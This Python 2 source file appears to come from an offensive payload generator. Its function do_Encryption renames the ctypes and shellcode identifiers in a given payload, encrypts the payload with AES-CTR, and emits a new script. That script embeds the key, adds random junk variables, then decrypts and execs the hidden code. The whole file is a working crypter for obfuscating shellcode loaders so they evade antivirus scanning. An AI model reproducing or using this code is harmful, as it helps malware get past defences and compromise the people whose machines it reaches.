import Crypto.Cipher.AES as AES
import os
import random
import string

def randomVar():
    return ''.join(random.sample(string.ascii_lowercase, 8))

def randomJunk():
    newString = ''
    for i in xrange(random.randint(1, 10)):
        newString += ''.join(random.sample(string.ascii_lowercase, random.randint(1, 26)))
    return newString

def do_Encryption(payload):
    counter = os.urandom(16)
    key = os.urandom(32)

    randkey = randomVar()
    randcounter = randomVar()
    randcipher = randomVar()

    randdecrypt = randomJunk()
    randshellcode = randomJunk()

    randctypes = randomJunk()
    randaes = randomJunk()

    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    encrypted = encrypto.encrypt(payload.replace('ctypes',randctypes).replace('shellcode',randshellcode))

    newpayload = "# -*- coding: utf-8 -*- \n"
    newpayload += "%s = '%s'\n"% (randomVar(), randomJunk())
    newpayload += "import Crypto.Cipher.AES as %s \nimport ctypes as %s \n" %(randaes, randctypes)
    newpayload += "%s = '%s'.decode('hex') \n" % (randkey, key.encode('hex'))
    newpayload += "%s = '%s'.decode('hex') \n" % (randcounter, counter.encode('hex'))
    newpayload += "%s = '%s'\n"% (randomVar(), randomJunk())
    newpayload += "%s = %s.new(%s , %s.MODE_CTR, counter=lambda: %s )\n" % (randdecrypt, randaes, randkey, randaes, randcounter)
    newpayload += "%s = %s.decrypt('%s'.decode('hex')) \n" % (randcipher, randdecrypt, encrypted.encode('hex'))
    newpayload += "exec(%s)" % randcipher
    return newpayload
